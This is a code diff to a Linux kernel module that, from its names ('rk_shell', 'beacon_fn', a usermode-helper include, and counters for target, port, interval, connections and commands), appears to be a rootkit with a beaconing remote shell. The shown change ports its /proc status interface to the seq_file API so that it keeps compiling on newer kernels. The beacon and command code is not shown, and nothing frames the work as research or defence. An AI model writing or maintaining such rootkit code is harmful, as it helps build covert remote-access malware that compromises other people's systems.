@@ -11,6 +11,7 @@
 #include <linux/net.h>
 #include <linux/printk.h>
 #include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 #include <linux/slab.h>
 #include <linux/umh.h>
 
@@ -152,24 +153,18 @@ static int beacon_fn(void *data)
 	return 0;
 }
 
-static ssize_t shell_read(struct file *f, char __user *buf,
-			    size_t count, loff_t *pos)
+static int shell_read(struct seq_file *m, void *v)
 {
-	char tmp[128];
-	int len = snprintf(tmp, sizeof(tmp),
-			   "target=%s\nport=%d\ninterval=%d\n"
+	seq_printf(m, "target=%s\nport=%d\ninterval=%d\n"
 			   "connections=%lu\ncommands=%lu\n",
-			   target, port, interval, connections, commands);
-	return simple_read_from_buffer(buf, count, pos, tmp, len);
+		   target, port, interval, connections, commands);
+	return 0;
 }
 
-static const struct proc_ops shell_proc_ops = {
-	.proc_read = shell_read,
-};
 
 static int __init shell_init(void)
 {
-	proc_entry = proc_create("rk_shell", 0444, NULL, &shell_proc_ops);
+	proc_entry = proc_create_single("rk_shell", 0444, NULL, shell_read);
 	if (!proc_entry)
 		return -ENOMEM;
 
